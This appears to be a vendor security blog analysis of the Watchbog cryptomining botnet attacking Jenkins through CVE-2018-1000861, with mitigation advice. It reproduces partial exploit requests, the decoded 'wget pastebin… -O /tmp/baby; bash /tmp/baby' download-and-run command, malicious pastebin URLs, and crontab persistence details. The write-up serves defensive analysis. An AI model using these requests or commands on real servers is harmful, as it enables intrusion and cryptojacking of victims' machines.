Watchbog, a cryptocurrency-mining botnet, has made a comeback by exploiting Jenkins
CVE-2018-1000861 this time.
On May 12th 2019, we observed Watchbog, a cryptocurrency-mining botnet, started a grand
attack aiming at Jenkins. Infected servers do not automatically attack its peers, meaning that
the trojan itself is not contagious. However, it still cause loss to victim users by mining
cryptocurrency and adding malicious commands to scheduled task for persistence.
Watchbog botnet is not new; it has previous conviction. Earlier this year, we detected
watchbog attacking services such as Nexus Repository Manager 3, ThinkPHP and Linux
Supervisord and deploying miners with highly similar technique. The process is very
straightforward, as shown below:

This article gives insight into the attack event and provides suggestion for cleaning malware
and preventing future intrusion.

Start of Attack
We found this request on a victim Jenkins server, exploiting CVE-2018-1000861 :
GET
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbo
sandbox=True&value=public class x{public x(){new
String("776765742068747470733a2f2f706173746562696e2e636f6d2f7261772f42335235556e776820
HTTP/1.1
Host: [victim_host]:[jenkins_port]

This payload is different from another exploit targeting CVE-2019-1003000 we have seen in
another botnet event by ImposterMiner in February:
GET
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowD
value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27orange.tw%27,%20root=
HTTP/1.1
Host: [victim_host]:[jenkins_port]

The two payloads look alike because they both use the
"/securityRealm/user/admin/descriptorByName" gadget. Yet they are essentially different in
that CVE-2018-1000861 is a vulnerability in Jenkins' Stapler web framework, while CVE2019-1003000 is in Script Security Plugin.
The hex-encoded part in the former CVE-2018-1000861 payload downloads and runs
malicious shell command:
wget https://pastebin.com/raw/B3R5Unwh -O /tmp/baby
bash /tmp/baby

The contained url points to another pastebin url (https://pastebin.com/raw/J6NdVBHq), which
points to yet another.

2/7

The main part of malicious shell script is encoded and placed in
https://pastebin.com/raw/KGwfArMR.

Mining and Persistence
During execution of the aforesaid shell script, a cryptocurrency miner is installed on victim
server by downloading from following URL (decoded from $mi_64)
https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenialx64.tar.gz

Configuration file for mining is as follows:

3/7

The malicious shell script maintain persistence by adding itself to crontab.

Other tampered crontab files:

An ironic thing is that the threat actor says victims can contact him at jeff4rpartner@tutanota.com and promises to offer "cleanup script, source of entry and patch".

4/7

According to minexmr.com, the threat actor may have earned about 20 Moneros (1500USD)
as economic profit from mining.

Another thing worth mentioning is that we have reported malicious URLs to pastebin.com
and request to ban those addresses when watchbog first started its attack in March.
However pastebin.com has not replied or taken any effective action.

Security Suggestion
Services for internal use should not be exposed to the Internet. Use adequate ACL or
other authentication techniques to only allow access from trusted users.
It is necessary for users to upgrade their software in time, especially when the vendor
of software has published security-related advisory.
Since pastebin.com has been used by many botnets, users who do not often visit this
website may use some tricks to drop packets to and from it, such as on Linux you can
run: echo -e "\n0.0.0.0 pastebin.com" >> /etc/hosts This command
sinkholes(redirects) any traffic to and from pastebin.com.
Cloud firewalls are useful in preventing attacks. We recommend Alibaba Cloud Firewall
because it is able to detect, block and analyze threats. You will be protected from
intrusion and malicious mining with AI technologies on your side.
